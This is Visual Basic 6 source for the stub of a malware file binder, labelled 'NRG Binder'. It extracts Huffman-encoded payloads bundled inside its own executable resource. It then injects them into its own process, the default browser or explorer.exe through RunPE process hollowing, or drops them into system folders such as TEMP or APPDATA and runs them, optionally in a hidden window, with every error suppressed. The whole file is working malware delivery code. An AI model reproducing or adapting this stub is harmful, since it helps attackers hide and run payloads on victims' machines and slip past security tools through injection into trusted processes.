Attribute VB_Name = "modMain"
'---------------------------------------------------------------------------------------
' Module    : modMain
' Author    : Cyntax
' Date      : 4/6/2010
' Purpose   : NRG Binder Stub Module
'---------------------------------------------------------------------------------------

Option Explicit

Const S1 = "[-]"
Const S2 = "|-|"
Const S3 = "{-}"

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function FindResource Lib "kernel32" Alias "FindResourceA" (ByVal hInstance As Long, ByVal lpName As String, ByVal lpType As String) As Long
Private Declare Function LoadResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function LockResource Lib "kernel32" (ByVal hResData As Long) As Long
Private Declare Function SizeofResource Lib "kernel32" (ByVal hInstance As Long, ByVal hResInfo As Long) As Long
Private Declare Function FreeResource Lib "kernel32" (ByVal hResData As Long) As Long
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long

Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Private Function DefaultWebBrowser() As String
    Dim oWScript As Object
    Dim sPath As String

    Set oWScript = CreateObject("WScript.Shell")

    sPath = oWScript.RegRead("HKEY_CLASSES_ROOT\http\shell\open\command\")
    sPath = Mid(sPath, 2, Len(sPath))
    sPath = Split(sPath, Chr(34))(0)

    DefaultWebBrowser = sPath
    Set oWScript = Nothing
End Function

Sub Main()
    On Error Resume Next

    Dim i As Integer
    Dim iFF As Integer

    Dim lMod As Long
    Dim lRes As Long
    Dim lLoad As Long
    Dim lLock As Long
    Dim lSize As Long

    Dim sData As String
    Dim sBuffer As String
    Dim sName As String
    Dim sPath As String
    Dim sExecution As String
    Dim sParameters As String

    Dim sLayer1() As String
    Dim sLayer2() As String
    Dim sLayer3() As String

    Dim cPEL As New clsPEL
    Dim cHuffman As New clsHuffman

    iFF = FreeFile

    lMod = GetModuleHandle(vbNullString)
    lRes = FindResource(lMod, 101, "CUSTOM")
    lLoad = LoadResource(lMod, lRes)
    lLock = LockResource(lLoad)
    lSize = SizeofResource(lMod, lRes)
    sData = Space(lSize)

    Call CopyMemory(ByVal sData, ByVal lLock, lSize)
    Call FreeResource(lLoad)

    sLayer1() = Split(sData, S1)

    For i = 1 To UBound(sLayer1)

        sLayer2() = Split(sLayer1(i), S2)
        sLayer3() = Split(sLayer2(1), S3)

        sBuffer = cHuffman.DecodeString(sLayer2(0))
        sName = cHuffman.DecodeString(sLayer3(0))
        sPath = cHuffman.DecodeString(sLayer3(1))
        sExecution = cHuffman.DecodeString(sLayer3(2))
        sParameters = cHuffman.DecodeString(sLayer3(3))

        Select Case sPath
        Case "%HOMEDRIVE%"
            sPath = Environ("HOMEDRIVE")
        Case "%WINDIR%"
            sPath = Environ("WINDIR")
        Case "%APPDATA%"
            sPath = Environ("APPDATA")
        Case "%TEMP%"
            sPath = Environ("TEMP")
        Case Else
            sPath = App.Path
        End Select

        sPath = sPath & "\" & sName

        Select Case sExecution
        Case "Process Injection (Stub)"
            Call cPEL.RunPE(StrConv(sBuffer, vbFromUnicode))
        Case "Process Injection (Browser)"
            Call cPEL.RunPE(StrConv(sBuffer, vbFromUnicode), DefaultWebBrowser)
        Case "Process Injection (Explorer)"
            Call cPEL.RunPE(StrConv(sBuffer, vbFromUnicode), Environ("WINDIR") & "\EXPLORER.EXE")
        Case Else
            Open sPath For Binary As #iFF
            Put #iFF, , sBuffer
            Close #iFF

            If sParameters = "N/A" Then sParameters = vbNullString

            Select Case sExecution
            Case "Shell Execute (Normal)"
                Call ShellExecute(0, "open", sPath, sParameters, vbNullString, 1)
            Case "Shell Execute (Hidden)"
                Call ShellExecute(0, "open", sPath, sParameters, vbNullString, 0)
            End Select
        End Select
    Next i
End Sub
